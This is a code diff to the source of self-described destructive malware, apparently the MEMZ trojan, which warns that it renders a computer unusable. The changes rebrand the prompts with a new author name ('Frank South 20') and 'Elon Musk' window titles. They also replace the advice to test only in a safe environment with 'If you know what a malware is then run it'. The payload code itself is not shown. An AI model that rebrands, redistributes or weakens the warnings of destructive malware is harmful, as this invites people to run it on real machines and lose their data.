@@ -48,16 +48,16 @@ void main() {
 			}
 		}
 	} else {
-		// Another very ugly formatting
-		if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
+		
+		if (MessageBoxA(NULL, "The software you just executed is considered malware that is made by ( Frank South 20 ).\r\n\
 This malware will harm your computer and makes it unusable.\r\n\
 If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
-If you know what this malware does and are using a safe environment to test, \
+If you know what a malware is then run it, \
 press Yes to start it.\r\n\r\n\
 DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "Elon Musk", MB_YESNO | MB_ICONWARNING) != IDYES ||
 MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
 THE CREATOR ( Frank South 20 ) IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
-STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
+STILL EXECUTE IT?", "Elon_Musk", MB_YESNO | MB_ICONWARNING) != IDYES) {
 			ExitProcess(0);
 		}
 
@@ -312,7 +312,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 If you have productive data on your system or signed in to online accounts, it is recommended to run this payload inside a \
 virtual machine in order to prevent potential data loss or changed things you might not want.\r\n\r\n\
 Do you still want to enable it?",
-"MEMZ", MB_YESNO | MB_ICONWARNING) == IDYES) {
+"Elon_Musk", MB_YESNO | MB_ICONWARNING) == IDYES) {
 						SendMessage((HWND)lParam, BM_SETCHECK, BST_CHECKED, NULL);
 					}
 				}
